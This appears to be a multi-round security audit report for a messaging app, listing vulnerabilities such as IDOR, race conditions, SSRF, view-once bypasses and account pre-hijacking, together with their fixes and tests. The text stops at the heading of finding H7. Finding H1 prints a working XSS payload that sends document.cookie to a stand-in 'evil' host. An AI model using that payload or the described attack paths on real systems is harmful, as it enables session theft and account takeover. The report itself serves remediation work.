# RELAY — Security Audit & Remediation

**Date:** 2026-07-22
**Scope:** Full reachable attack surface — client ↔ server connections (tRPC API, SSE + POST signaling), the WebRTC signaling engine, storage/attachment authorization, auth flows, the mailer, the SigV4 S3 signer, rate limiting, and the DB access layer. Owner-requested comprehensive review of "all app connections, front and back, and the database."
**Baseline commit:** `56c819e` (branch `claude/install-security-plugin-4g9z8p`)
**Method:** Automated vulnerability scan (Claude Security), followed by independent verification of every candidate finding against the current source, then targeted fixes with regression tests. No production data or live systems were touched.

**Result:** 5 findings confirmed (1 High, 2 Medium, 2 Low). **All 5 fixed.** Full suite green: **1179 passing / 1 skipped**, `tsc --noEmit` clean, production build clean.

Owner-accepted design decisions documented in `CLAUDE.md` (SSE-instead-of-WebSocket signaling, the intentionally-kept `/api/oauth/callback`, and the temporary `RELAY_OTP_REGISTER_BYPASS` email-outage stopgap) were reviewed and are **not** defects.

---

## Summary table

| ID | Severity | Area | Status |
|----|----------|------|--------|
| F1 | **High** | Signaling `register` had no binding to the authenticated identity | Fixed |
| F2 | Medium | `updateProfile` accepted an avatar key the caller didn't own → laundered to public | Fixed |
| F3 | Medium | Burning view-once media made it *more* accessible (served unauthenticated) | Fixed |
| F4 | Low | Per-IP rate limits keyed on a spoofable `X-Forwarded-For` hop | Fixed |
| F5 | Low | Unauthenticated, unthrottled directory enumeration | Fixed |

---

## F1 — Signaling number claimed with no identity binding (HIGH)

**Where:** `server/relay.ts` — the `register` handler and `POST /api/relay/send`.

**Problem.** The SSE + POST signaling transport was keyed only by a **client-minted `cid`**, and a client claimed its 6-digit number via the client-supplied `msg.pin` in the `register` message. Neither endpoint consulted the session/guest cookie, and `register` granted any requested number that was free (or already owned by the same `cid`). Because numbers are public identifiers (directory previews, `/i/<pin>` links), the only barrier — the number being currently connected — is absent for any user whose app is backgrounded or closed.

**Impact.** An attacker who knows a target number (public) and finds it not currently connected could:
- **Intercept inbound calls** — register the victim's number, then answer calls dialed to the victim over live voice/video + the in-call data channel; and
- **Spoof caller-ID** — place calls presenting the victim's name and number to a third party.

This was conspicuous next to `/api/v2/events` and the whole tRPC layer, which already bind the connection to a server-resolved identity via `createContext`.

**Fix.** Bind the claimed number to the authenticated caller. `POST /api/relay/send` now, for `register` messages only, resolves the caller's own identity number from their session/guest cookie (via the same `createContext` used everywhere else) and stamps it on a **server-only** `__ownedNumber` field (any client-supplied value is stripped first). The `register` handler uses that number and ignores a mismatched `msg.pin`:
- resolved number → the caller gets **their own** number (also self-heals a client stale after `regenerateNumber`);
- resolved to `null` (no cookie, or a resolution error) → an explicit claim is **refused**; a fresh number is allocated (fail closed);
- field absent (direct `handleMessage` / unit tests) → legacy behavior preserved.

Because `EventSource` can't send custom headers but the signaling **POSTs** can, the client now also attaches the stable `x-relay-device-id` header on `/api/relay/send`, so guests whose cookie was dropped by Safari ITP / privacy mode still resolve to their real number (same cookie-loss fallback the tRPC client and upload route use). Only `register` pays the async identity-resolution cost; every other signaling message (offer/answer/ICE) still runs fully synchronously.

**Residual note.** The `signal` case still relays SDP/ICE to any registered number without a room-membership check. With numbers now bound to identities this is a much smaller surface (you can only originate from your own number), but a room-membership assertion on `signal` is recommended as follow-up hardening.

**Tests.** `server/securityAudit.test.ts` — a client is bound to its resolved number and a mismatched requested pin is ignored; an attacker cannot seize a victim's offline number; a null identity cannot claim a free number; same-cid reconnect keeps its bound number; the legacy no-field path is unchanged; plus source pins for the handler's strip/resolve/fail-closed wiring.

---

## F2 — Avatar URL accepted a key the caller didn't own (MEDIUM)

**Where:** `server/v2routers.ts` `identity.updateProfile` → `authorizeStorageKey` / `isIdentityAvatarKey` (`server/v2db.ts`) → `server/_core/storageProxy.ts`.

**Problem.** `updateProfile` validated only the **shape** of `avatarUrl` (`/manus-storage/…`, `http(s)://`, `data:image/`), not ownership — unlike `attachments.register` and `status.post`, which enforce `keyInOwnerNamespace`. `authorizeStorageKey` then rescues any key equal to *some* identity's current `avatarUrl` as a semi-public avatar, which the storage proxy serves to **anyone, even unauthenticated**.

**Impact.** A conversation participant could set their own `avatarUrl` to another user's **private attachment key** and thereby promote that private file to a stable, world-readable URL — surviving the sender's unsend.

**Fix.** `updateProfile` now rejects a `/manus-storage/` `avatarUrl` whose key is not in the caller's own upload namespace (`keyInOwnerNamespace(key, me.id, …)`), matching `attachments.register` and `status.post`. Absolute (`https`) and `data:` URIs are unaffected — they never resolve through the storage proxy. (F1/F2 reinforce each other: a stranger's attachment key lives in the sender's namespace, so it can no longer be laundered into an avatar.)

**Tests.** `server/securityAudit.test.ts` pins the ownership gate on the write path; `server/attachmentAuth.test.ts` already proves `keyInOwnerNamespace` correctness.

---

## F3 — Burning view-once media made it unauthenticated-public (MEDIUM)

**Where:** `server/v2db.ts` `consumeExpiringMessage` + `authorizeStorageKey` + `server/_core/storageProxy.ts`.

**Problem.** On "burn", `consumeExpiringMessage` **deleted the attachments row** to "revoke media access." But the S3 object persists, and with no row `authorizeStorageKey` classifies the key as `kind:"unknown"` — which the storage proxy serves **without any auth check**. Net effect: a destroyed view-once clip went from participant-gated to world-served-if-URL-known. (Status media, by contrast, correctly fails *closed*.)

**Impact.** A "burned" clip's `/manus-storage/<key>` URL kept resolving for anyone (no login), the opposite of the feature's privacy promise.

**Fix.** `consumeExpiringMessage` no longer deletes the row. The message's `attachmentId` is nulled (which already revokes participant access via `getAttachmentForIdentity` — no conversation references the file), and keeping the row keeps the key classified as `attachment`, so `authorizeStorageKey` returns *unauthorized* and the proxy returns **403** for every non-uploader — fail **closed**, matching the status-media model (ephemeral at the access layer even though the object lingers in the bucket).

**Tests.** `server/peerIdentityBatch.test.ts` (updated) asserts consume nulls the link, does **not** delete the row, and documents the fail-closed rationale.

---

## F4 — Rate limits keyed on a spoofable `X-Forwarded-For` hop (LOW)

**Where:** `server/rateLimit.ts` `clientIpOf`, `server/v2routers.ts` `pickClientIp`.

**Problem.** Both trusted the **leftmost** `X-Forwarded-For` hop. Behind the documented AWS ALB (which *appends* the real peer IP to the right), the leftmost value is attacker-supplied, so rotating `X-Forwarded-For` mints a fresh rate-limit bucket per request and defeats every per-IP limiter (`/api/relay/send`, OTP gate, stream/ICE, party-line, status). Account-level protections (OTP attempt cap, PIN lockout — keyed on email/account) still held, so this weakened abuse/DoS backstops, not account security.

**Fix.** Both helpers now trust the hop the front proxy **appended** — `trustedProxyHops()` positions from the right (default `1` = a single ALB; set `RELAY_TRUSTED_PROXY_HOPS=2` for a CloudFront → ALB chain). A client cannot forge that hop. `CF-Connecting-IP` remains preferred where Cloudflare is the front proxy. Falls back to the leftmost real hop then the socket address.

**Tests.** `server/rateLimit.test.ts` and `server/geoSelf.test.ts` (updated) assert the rightmost hop is trusted, a rotating spoofed leftmost hop can't change the keyed IP, and `RELAY_TRUSTED_PROXY_HOPS` is honored.

**Ops note.** Deployments with more than one trusted proxy in front of the app must set `RELAY_TRUSTED_PROXY_HOPS` to the proxy count. The `.io` ALB-only deployment needs no change (default 1).

---

## F5 — Unauthenticated, unthrottled directory enumeration (LOW)

**Where:** `server/v2routers.ts` `directory.lookup` and `directory.presenceMany`.

**Problem.** `lookup` is a `publicProcedure` with no rate gate; for any 6-digit number it returns existence, display name, avatar URL, verified badge, and live presence. The 10⁶ number space was freely and silently enumerable — a full scrape of the user directory.

**Fix.** A generous per-IP token bucket (`directoryGate`: 120 burst, ~60/min sustained, keyed on the now-trusted client IP, honoring `RELAY_RATELIMIT_OFF`) now gates `lookup` and `presenceMany`. This is invisible to any real dialer but turns a full enumeration into a multi-day, obvious grind. The endpoints stay **public** on purpose — an unidentified visitor opening an `/i/<pin>` call link resolves the callee via `lookup` before entering a name — so requiring identity was deliberately avoided.

**Tests.** `server/securityAudit.test.ts` pins the limiter/gate definition, its application to both procedures, and the `RELAY_RATELIMIT_OFF` escape hatch.

---

## Files changed

- `server/relay.ts` — F1: server-only `__ownedNumber`, resolved via `createContext` on `register`, bound in the register handler.
- `client/src/lib/relayClient.ts` — F1: send `x-relay-device-id` on `/api/relay/send`.
- `server/v2routers.ts` — F2: avatar-key ownership gate; F4: `pickClientIp` trusts the appended hop; F5: `directoryGate` on `lookup`/`presenceMany`.
- `server/v2db.ts` — F3: stop deleting the attachment row on consume (fail closed).
- `server/rateLimit.ts` — F4: `trustedProxyHops()` + rightmost-hop `clientIpOf`.
- Tests: `server/securityAudit.test.ts` (new), `server/rateLimit.test.ts`, `server/geoSelf.test.ts`, `server/peerIdentityBatch.test.ts`, `server/relayCluster.integration.test.ts`.

---

# Round 2 — full-platform deep sweep (v2.98.4)

After the initial 5 findings, an exhaustive multi-agent sweep covered 12 attack
surfaces (auth/sessions, the rest of signaling, storage/SigV4, tRPC IDOR, SQL,
crypto/secrets, SSRF, email/inbound, client XSS/CSP, DoS/ReDoS, the Redis-bus
cluster, and HTTP headers/config). Every candidate was put through an
independent adversarial verifier and then re-verified by hand against current
source before any change. **7 confirmed + 6 partial** survived verification; 8
were refuted. All confirmed findings and the meaningful partials are fixed
below (S1–S11).

| ID | Severity | Area | Status |
|----|----------|------|--------|
| S1 | **High** | PIN lockout bypass via a lost-update race (concurrent wrong guesses) | Fixed |
| S2 | Medium | `signal` relay had no room-membership check → ICE-candidate harvesting / IP deanonymization | Fixed |
| S3 | Low | `directory.presence`: anonymous, unthrottled presence + last-seen enumeration (no guest-privacy) | Fixed |
| S4 | Low | `directory.watchOnline`: unthrottled number-enumeration + name-harvest oracle | Fixed |
| S5 | Low | `calls.logStart`: unthrottled existence oracle + call-history row injection | Fixed |
| S6 | Low | `messages.markRead`: read-receipt IDOR across conversations you're not in | Fixed |
| S7 | Low | `POST /api/v2/upload`: no rate limit / quota → storage-cost DoS | Fixed |
| S8 | Low | Web Push endpoint: unvalidated URL → authenticated blind (HTTPS) SSRF | Fixed |
| S9 | Low | OTP attempt-counter lost-update race (same class as S1) | Fixed |
| S10 | Low | Session HMAC secret fell back to a public constant when `JWT_SECRET` unset | Fixed (fail closed in prod) |
| S11 | Low | Inbound-email HMAC secret same fail-open + unthrottled webhook | Fixed (fail closed in prod + rate limit) |

## S1 — PIN lockout bypass via a lost-update race (HIGH)

**Where:** `server/authPin.ts` `attemptPinLogin`.
**Problem.** The wrong-attempt counter was written as `stale_read + 1`: the code read `loginPinAttempts`, judged the verdict, then wrote a fixed value. N concurrent wrong guesses all observed `attempts = 0` and each wrote `1`, so increments were lost and an attacker could blow past the 3-try cap and brute-force the 10⁴ PIN space.
**Fix.** Increment + lock-on-threshold in a single conditional `UPDATE` guarded on `loginPinLockedAt IS NULL`, and derive the verdict from the **persisted** post-increment value (read back), not the stale caller count. Once the count crosses the cap the row locks and every later guess fails the guard. The lock email is sent exactly once (gated on the statement that crossed the threshold via `affectedRows`).

## S2 — `signal` relay had no room-membership check (MEDIUM)

**Where:** `server/relay.ts` `signal` case.
**Problem.** The `signal` relay forwarded SDP/ICE to any *currently-registered* pin with no check that the sender and target share a call. Any client with a guest identity who knew a victim's (public) number could, while the victim is merely online, force a silent WebRTC handshake and harvest the victim's host/srflx ICE candidates — **IP deanonymization** with no call, ring, or media consent.
**Fix.** Relay only when the sender and target share a room (active `pinRoom`/`roomId` **or** held `heldRoom`), mirroring the membership discipline already on `accept`/`reject`. Behavioral test added (positive in-room relay + negative out-of-room drop).

## S3–S5 — enumeration gaps that bypassed the F5 throttle (LOW)

`directory.presence`, `directory.watchOnline`, and `calls.logStart` each resolved identities / presence without the per-IP `directoryGate` that F5 added to `lookup`/`presenceMany`, leaving free enumeration + (for `watchOnline`) name-harvest and (for `logStart`) call-history row injection over the 10⁶ number space. **Fix:** apply `directoryGate(ctx)` to all three, and add the guest-privacy (`isGuestPresenceHidden`) pass to `presence` so hidden guests don't leak last-seen. Endpoints stay public (the `/i/<pin>` direct-join needs them).

## S6 — `markRead` read-receipt IDOR (LOW)

**Where:** `server/v2db.ts` `markThreadRead` + the `messages.markRead` router.
**Problem.** The `unreadCount` write was membership-scoped, but the peer-message `status:"read"` UPDATE was not — any identity could iterate conversation ids and flip other conversations' inbound messages to "read", corrupting real participants' delivery receipts (and the router fanned out a `read` SSE regardless).
**Fix.** Confirm `conversationParticipants` membership inside the same transaction and bail out for non-members; `markThreadRead` now returns whether the caller was a member, and the router only fans out the SSE when true.

## S7 — upload endpoint DoS (LOW)

**Where:** `server/v2upload.ts`.
**Problem.** `POST /api/v2/upload` had no rate limit or quota; a single free guest could loop ~40 MB PUTs into the operator's S3 bucket (storage/egress cost DoS).
**Fix.** Per-IP **and** per-identity token buckets (generous — a photo is thumb + full = 2 calls), checked before any `storagePut`, honoring `RELAY_RATELIMIT_OFF`.

## S8 — Web Push endpoint SSRF (LOW)

**Where:** `server/v2routers.ts` `push.subscribe` → `server/webPush.ts`.
**Problem.** The `webpush` `endpoint` is a client-supplied URL the server later connects to (`web-push` → `https.request`). No validation meant a caller could subscribe with an internal URL and turn a later push into a blind SSRF (e.g. cloud metadata / a VPC service).
**Fix.** New `isAllowedWebPushEndpoint` requires `https:` on a known push-service host (FCM / Mozilla / WNS / Apple); enforced on `subscribe` and again defensively before `sendNotification` (legacy rows dropped). FCM tokens (not URLs) are unaffected.

## S9 — OTP attempt-counter race (LOW)

**Where:** `server/authOtp.ts` `recordOtpFailure`. Same lost-update class as S1. **Fix:** atomic guarded `UPDATE` (increment + burn-on-cap), verdict from the persisted count.

## S10 / S11 — signing secrets failed open in production (LOW)

**Where:** `server/authLocal.ts` `sessionSecret`, `server/emailInbound.ts` `inboundSecret`.
**Problem.** Both fell back to a public constant (`"relay-dev-secret"` / `"relay-inbound-dev-secret"`) when `JWT_SECRET`/`INBOUND_EMAIL_SECRET` were unset. The session token is a bare HMAC over `"<userId>.<exp>"` with no server store, so the public constant would make session forgery for any user trivial. Not exploitable on the correctly-provisioned `.io` fleet (which sets `JWT_SECRET`), but a latent fail-open.
**Fix.** Fail **closed** in production (`NODE_ENV === "production"` → throw rather than sign/verify with the public constant); dev/test keep the fallback. The inbound webhook route also gained a per-IP rate limit.

## Verification (round 2)

`pnpm check` clean; `pnpm test` **1208 passing / 1 skipped**; `pnpm build` clean. New `server/securitySweep.test.ts` (behavioral SSRF-allowlist tests + source pins for S1/S3–S11); `server/relay.test.ts` gained a behavioral S2 test (in-room relay works, out-of-room is dropped).

## Accepted residuals / follow-ups (not changed)

- **Signaling invite fan-out** (partial): no per-caller outstanding-ring cap / `pendingRings` reaper. The verifier downgraded the "one message → O(N)" framing (each invite is an individual rate-limited POST), and the risk of a too-low cap or too-short reaper TTL breaking legitimate group dials / slow-answer paging outweighs the bounded benefit — deliberately not changed in this batch.
- **Inbound webhook signature** stays opt-in (`INBOUND_EMAIL_WEBHOOK_SECRET`), since making it mandatory would break operators running inbound email without it; the reply path is still bound by the `From == owner-email` check.
- Consider deleting/overwriting the S3 object on view-once consume for defense-in-depth (the access layer already fails closed — F3).
- Set `RELAY_TRUSTED_PROXY_HOPS` explicitly on any deployment with more than one front proxy.
- No CSP / `X-Frame-Options` header (deliberate — the app is framed by the editor; refuted as no-exploit); revisit if the framing requirement is dropped.

---

# Round 4 (2026-07-24) — full backend + frontend sweep via the dedicated `claude-security` orchestrator

Owner request: *"expose the security bugs... check the entire app... I want full backend and frontend."* The `claude-security` orchestrator was dispatched across every surface (tRPC authz/IDOR, auth/crypto/session, client trust surface, raw Express routes, mobile/CI/secrets, client XSS, the signaling engine, the S3 driver + mailer, push/redis-bus/events, inbound-email/well-known/seo). Every candidate it raised, plus a direct manual re-read of the surfaces above, was independently verified against source before any fix — the same bar as prior rounds. 11 confirmed and fixed.

## G1 — storage-proxy key-normalization bypass (HIGH)

**Where:** `server/_core/storageProxy.ts`.
**Problem.** `authorizeStorageKey(key, identityId)` ran its exact-string DB lookup against the RAW request key, while `s3PresignGetUrl` (called later, only at presign time) silently normalized the key via `sanitizeS3Key` — collapsing a run of slashes (`a//b` → `a/b`) and stripping a leading `/` *before* its own segment checks ever see it. A real private attachment's key with an extra `/` inserted therefore missed the exact-match lookup (classified `unknown`, the fail-open branch reserved for non-attachment keys like avatars) while still normalizing back to — and serving — the real object, with no participant check. This also re-exposed "burned" view-once media (F3, round 1) via the same mismatch.
**Fix.** Canonicalize the key ONCE via `sanitizeS3Key` at the top of the request handler, before authorization; every downstream step (authorization, the response cache key, and the presign) now operates on that single canonical string, making the mismatch structurally impossible.

## G2 — `openThread` / `createGroup` block bypass (MED)

**Where:** `server/v2routers.ts` `messages.openThread`, `messages.createGroup`.
**Problem.** Blocking a number stopped `messages.send` but not thread/group *creation* — a blocked-by target could still have a brand-new empty DM or a fresh group forced into their inbox, pointless-ifying the block.
**Fix.** Both endpoints now check `isNumberBlockedBy` before creating a FRESH thread/group (an existing thread that predates the block keeps working, mirroring send-blocking's non-retroactive behavior) and respond identically to "not found"/silently exclude the member, so the block is never revealed to the blocked caller.

## G3 — `push.unsubscribe` IDOR (LOW)

**Where:** `server/v2routers.ts` `push.unsubscribe` → `server/v2db.ts`.
**Problem.** Deleted a push-subscription row keyed only on the client-supplied `endpoint`, with no ownership check — anyone who learned a victim's endpoint string (log leakage, a referrer, the native FCM token) could silently kill their incoming-call/missed-call push notifications.
**Fix.** New `deleteOwnPushSubscription(identityId, endpoint)` scopes the delete to the caller's own identity; the original unscoped `deletePushSubscription` is kept for `webPush.ts`'s own dead-token cleanup, which has no identity context.

## G4 — `attachments.register` arbitrary client `url` (MED)

**Where:** `server/v2routers.ts` `attachments.register`.
**Problem.** The input schema accepted a free-form `url` from the client and stored it verbatim, even though `storageKey` was already ownership-validated. Every client surface (`AttachmentView`/`FileCard`/`MediaLightbox`) trusts the returned `url` to be a same-origin `/manus-storage/{key}` path and renders it directly with no scheme check — an attacker-chosen `url` was a no-interaction tracking beacon (image attachments auto-load) or a phishing open-redirect.
**Fix.** `url` is no longer accepted from the client; it's derived server-side as `` `/manus-storage/${storageKey}` `` after the existing namespace check, matching exactly what `/api/v2/upload` already produces.

## G5 — OAuth session secret fail-open (LOW)

**Where:** `server/_core/sdk.ts` `getSessionSecret()`.
**Problem.** Fell back to an empty/undefined key when `JWT_SECRET` was unset, the same fail-open class already closed for other secrets in S10/S11 (round 2) but missed here.
**Fix.** Throws in production when unset, matching the established fail-closed convention; dev/test unaffected.

## G6 — `cidToPin` unbounded memory growth (LOW)

**Where:** `server/relay.ts`.
**Problem.** A signaling client that disconnected mid-call kept its `cidToPin` entry (by design, to support reconnect-and-auto-rejoin) — but once the room later reaped with no reconnect, nothing ever cleared that entry, an unbounded per-cid leak over the process lifetime.
**Fix.** A 15-minute sweep purges `cidToPin` entries that have no live client AND no active-or-held room — deliberately checking all three, since `reg.clients` alone would wrongly purge entries during the legitimate in-call reconnect window (`cleanupRegistryConn` clears `clients` immediately on any disconnect, in-call or not).

## G7 — Redis bus event-kind allowlist (LOW)

**Where:** `server/v2events.ts`.
**Problem.** `relay:v2ev` has no message authentication (anything with VPC/security-group reach to the Redis node can publish); `_handleBusV2Event` validated only that an envelope had a string `kind`, not that it was a real one.
**Fix.** A `KNOWN_V2_EVENT_KINDS` allowlist drops any envelope outside the actual `V2Event` union before it reaches a browser's SSE stream — a cheap backstop, not a substitute for transport-level authentication (see residuals).

## G8 — SMTP STARTTLS response-injection (LOW)

**Where:** `server/smtp.ts` `makeWire`.
**Problem.** CVE-2011-0411-class: the plaintext read buffer was a closure shared across the STARTTLS upgrade boundary. An on-path attacker could pack extra reply lines into the same TCP segment as the genuine "220 go ahead," and those bytes would be the first thing consumed once the encrypted session started reading — letting a MITM forge the perceived outcome of the real, encrypted dialog.
**Fix.** `upgradeTls` now clears the buffer immediately before the TLS handshake, so nothing read before TLS can be interpreted as a reply within the TLS session.

## G9 — weak RNG for 6-digit number allocation (LOW)

**Where:** `server/v2db.ts` `randomDigits6`.
**Problem.** Used `Math.random()` (V8's xorshift128+, recoverable from a handful of observed outputs) while every other identifier in the codebase (OTP codes, guest/verification tokens) already used a CSPRNG. Numbers are semi-public dialing addresses, not secrets, so the practical exploit is narrow (predicting/pre-claiming a soon-to-be-issued number).
**Fix.** Switched to `crypto.randomInt`.

## G10 — `appUrl.ts` host-header validation (LOW)

**Where:** `server/appUrl.ts` `requestOrigin()`.
**Problem.** Fed an unvalidated `X-Forwarded-Host`/`Host` header straight into sitemap XML and (as one contributing factor, narrowed not eliminated) email-verification links.
**Fix.** A `SAFE_HOST_RE` allowlist rejects malformed/injection-shaped host values before they're used.

## G11 — CI/CD command injection in `aws-ops.yml`'s `ses-ssm` action (MED)

**Where:** `.github/workflows/aws-ops.yml`.
**Problem.** The `ses_email`/`domain` `workflow_dispatch` free-text inputs were spliced unescaped into single-quoted command strings executed on production EC2 via SSM `RunShellScript` — a value containing a quote or semicolon could break out of the intended quoting and inject arbitrary shell commands under the EC2 instance role.
**Fix.** Both values are base64-encoded on the GitHub Actions runner and decoded ONLY inside the remote-executed command string, the same treatment the adjacent `DESC_B64` (account-description) value already used. The sibling `iam-grant-ses` action was reviewed and found NOT vulnerable to the same class — its interpolation of the same inputs runs directly on the runner via safe single-pass double-quoted substitution, never re-serialized through a second (SSM remote) shell.

## Verification (round 4)

`pnpm check` clean; `pnpm test` **1392 passing / 1 skipped**; `pnpm build` clean. New/updated tests: `server/_core/storageProxy.test.ts` (+3: double-slash bypass, leading-slash normalization, trailing-slash rejection), `server/awsOps.test.ts` (+3: base64-encode-on-runner, decode-on-remote, absence of the old vulnerable splice shapes), plus source-pinned coverage for the block-bypass, push IDOR, attachment-URL, OAuth fail-closed, and `cidToPin`-reaper fixes.

## Accepted residuals / follow-ups (round 4, not changed)

- **Redis bus message authentication** — `relay:v2ev` still has no cryptographic authentication between publisher and subscriber; G7's allowlist bounds the blast radius of a forged envelope but doesn't prevent one from a host with VPC/SG-level reach. Closing this fully means either signing envelopes or trusting the VPC/SG boundary explicitly — an architectural decision, not a bug fix, and consistent with the existing "cross-instance relay rooms explicitly out of scope" stance in `CLAUDE.md`.
- **Cluster-leader trust of bus-forwarded identity fields** (`__ownedNumber`/`home`) — same Redis-trust-boundary class as G7/above; deferred alongside it.
- **No per-account password-login lockout** (only per-IP) — would need a new schema/design decision (which identity to lock, for how long, how it interacts with multi-device), out of scope for a fix-what's-broken pass.
- **Upload memory-exhaustion ordering** — `/api/v2/upload`'s rate limiter runs after the request body is already buffered; a flood of large bodies can still cost memory before being rejected. Noted, not fixed this pass.
- **`/api/v2/offline` has no rate limit** — the sendBeacon-driven presence-offline endpoint; noted, not fixed this pass.
- **Anonymous `/api/relay/ice` TURN credential minting** — any anonymous caller can mint short-lived TURN credentials for an arbitrary `who`; only a bandwidth-freeloading concern, and only matters once an operator configures a dedicated coturn (`TURN_SECRET`/`TURN_HOST`) rather than the free `openrelay` fallback.

---

# Round 5 (2026-07-24) — class-based sweep

Owner: *"make sure that you cover all type of security bugs. You fix them, and you check everything on a place on proper. Because I want the system to be very perfect."*

Rounds 1–4 audited **surface by surface** (tRPC routers, then auth, then storage, then the signaling engine). That structure kept re-walking the same code and had started returning diminishing results. Round 5 inverted the axis and audited by **vulnerability class** — injection, XSS, authz/IDOR, CSRF, SSRF, upload/path, crypto, race/TOCTOU, DoS/ReDoS, business logic, info disclosure, client trust, dependencies, CI — with each class asked to enumerate *every* sink of its kind and trace provenance for each. That is what surfaced the two HIGHs below, both of which live in code the earlier surface passes had already read.

It also covered v2.99.21–v2.99.36, which had never been security reviewed (≈2,500 changed lines, including the new M11 server-side ephemeral gating and the landing-page `innerHTML` rework).

10 findings, all verified against source before any change.

## H1 — zero-click DOM XSS in the in-call chat (HIGH)

**Where:** `client/src/lib/relayClient.ts`, `addChatMsg`.
**Problem.** A chat frame's `pin` arrives over the peer's **WebRTC data channel** and the receive path validated it with nothing but `typeof d.pin === "string"`. It was then interpolated into the message row's `innerHTML` **twice, unescaped**: once inside the double-quoted `data-pin="…"` attribute, and once through `fmtPin`, whose regex leaves a non-matching string completely unchanged. A peer sending

```
pin: 'x"><img src=x onerror=fetch("//evil/?"+document.cookie)>'
```

broke out of the attribute and injected a live element that executes **on parse** — no click, no hover, just receiving the message. Running on the app's own origin, that script drives the whole authenticated API as the victim (read every thread, send as them, edit the profile), i.e. session takeover. Reachable by anyone who can share a call — including a **party line**, which is joinable by number, so a single frame could hit every participant at once.

Notably, the correct check already existed three lines away: `ensureChatAvatar` guards on `/^\d{6}$/`. It just ran *after* the markup was written, so it protected the avatar fetch and not the render.

**Fix.** Validate rather than merely escape — a pin is always exactly six digits, so anything else is dropped to `undefined`. This also stops a malformed value reaching the `[data-pin="…"]` `querySelectorAll`. The `initials()` sinks on the chat chip, the call tiles, and the recents list were escaped as well: a 2-char slice can't carry an event handler, but a bare `<` still corrupts the parse, and escaping removes the need to reason about the length cap at each site.

## H2 — account pre-hijacking → full account takeover (HIGH)

**Where:** `server/authLocal.ts` (`/api/auth/register`, `/api/auth/login`) + `server/authOtp.ts` (`findUserByEmailAny`, `markUserEmailVerified`).
**Problem.** The classic pre-hijacking pattern, complete end to end:

1. `POST /api/auth/register` is unauthenticated and calls `createLocalUser`, which writes `loginMethod:"local"`, `passwordHash:<attacker's>`, `emailVerified:false` — for **any** email, including one that has never signed up.
2. The victim later signs up / signs in with an email one-time code. `findUserByEmailAny` deliberately falls back to a `local` row (v2.92, so pre-existing accounts keep working), so the OTP flow **resolves to the attacker's row** instead of creating a fresh one.
3. It then calls `markUserEmailVerified`, flipping `emailVerified` to true **and leaving the attacker's `passwordHash` in place**.
4. `POST /api/auth/login` requires only a matching password plus `emailVerified` — both now satisfied. The attacker signs in and shares the victim's account: every thread, contact, and call record, plus the ability to change the profile and number. The victim sees nothing amiss.

**Fix.** New `clearUnverifiedCredentials(userId)` nulls `passwordHash` and the PIN fields on a row that is still `emailVerified:false`, called at **both** OTP claim sites immediately *before* `markUserEmailVerified` (ordering is load-bearing — the helper's own guard is `emailVerified=false`, so flipping the flag first would make it a no-op). A credential set before the address was ever proven carries no trust. Scoped to unverified rows, so a legitimate local user who verified via their own emailed link keeps their password.

## H3 — view-once lock bypass via the attachment gate (MED→HIGH)

**Where:** `server/v2db.ts` `getAttachmentForIdentity`.
**Problem.** M11 (v2.99.34) stopped returning body/attachment from `messages.list` for a locked expiring message. But `getAttachmentForIdentity` authorized a non-uploader via **any** message referencing the attachment — including the still-locked one, whose `attachmentId` is only nulled at *burn* time. That single function is the gate behind `attachments.get` (which takes a sequential integer id, so a recipient can simply enumerate), `authorizeStorageKey`, **and** `messages.send`'s "do you own this attachment" check. So a recipient could:

- read view-once media repeatedly **without burning it** — the message stayed locked for everyone and the sender was never told it had been seen, defeating the entire guarantee; and
- **re-attach** the sender's view-once media to a brand-new message in another conversation, laundering content meant to vanish into a permanent one the original sender cannot unsend.

**Fix.** An un-consumed expiring message no longer serves as authorization (`JSON_EXTRACT(meta,'$.expire') IS NULL OR JSON_EXTRACT(meta,'$.consumedAt') IS NOT NULL`). The uploader's early return is above it, so senders are unaffected; a consumed message already fails closed per F3. `revealExpiring` remains the only path to locked content.

## H4 — MySQL left-to-right UPDATE assignment broke both attempt ladders (MED)

**Where:** `server/authPin.ts` (PIN lockout), `server/authOtp.ts` (OTP burn).
**Problem.** MySQL documents that single-table `UPDATE` SET assignments evaluate left to right, and a later assignment reads the value an earlier one **just wrote** (a deviation from standard SQL). Both ladders incremented the counter in assignment #1 and then re-added `+ 1` inside assignment #2's `CASE`, double-counting:

- **PIN:** effective test became `old + 2 > 3`, so the row locked on the **third** wrong entry rather than the fourth — and the persisted count could then only ever reach 3, while the lock-alert email fires only at exactly `PIN_MAX_ATTEMPTS + 1` (4). **That email was therefore unreachable: an account owner was never told their account was being brute-forced.** Locking early is fail-safe; silently dropping the alert is not.
- **OTP:** burned the code on the fourth wrong guess instead of the fifth, contradicting `OTP_MAX_ATTEMPTS` and the "attempts left" copy.

**Fix.** Compare the post-increment value directly in both. The regression test simulates MySQL's assignment order arithmetically, so the off-by-one cannot silently return.

## H5 — `startGuest` was an unthrottled identity minter (MED)

**Where:** `server/v2routers.ts`.
**Problem.** `startGuest` mints an `identities` row plus a permanent claim on one of ~980,000 six-digit numbers, is reachable with no cookie and no credential, and was the **only** unauthenticated resource-creating endpoint with no throttle (every comparable one already had a gate). The number space is finite and never reclaimed: `numberTaken` treats mere row existence as taken (it ignores guest expiry), nothing anywhere deletes identities, and M20's `number_reservations` ledger is deliberately monotonic. Drained far enough, `allocateSharedNumber`'s 40-attempt random search begins failing for **everyone**, and at exhaustion every new guest, every registration, and every party-line creation fails with "could not allocate a unique 6-digit number" — a slow, permanent, unauthenticated denial of service on all onboarding, with no recovery short of manual DB surgery.
**Fix.** `guestMintGate` — 20 burst, ~1 per 10s sustained per IP, honoring `RELAY_RATELIMIT_OFF`. The reuse paths return before allocating, so real visitors are unaffected.

## H6 — `revealExpiring` buffered an unbounded body (MED)

**Where:** `server/v2routers.ts`.
**Problem.** The size guard was `Number(resp.headers.get("content-length") ?? 0) <= CAP`, so an upstream response with **no** content-length yielded `0`, passed the check, and went straight into `arrayBuffer()` with no ceiling. The follow-up `buf.length <= CAP` check was too late — the memory was already committed. A lying (small) content-length had the same effect. The bytes are then base64'd (+33%) and serialized into a JSON tRPC response, so one request could pin several times the object's size in heap, on an endpoint throttled only per IP.
**Fix.** Reject an over-cap *declared* size cheaply, then read the stream with a hard `REVEAL_MAX_INLINE_BYTES` ceiling and cancel on exceed, so a missing or dishonest header cannot exceed the cap either.

## H7 — view-once burn was not atomic (MED)

**Where:** `server/v2db.ts` `consumeExpiringMessage`, `revealExpiringMessage`.
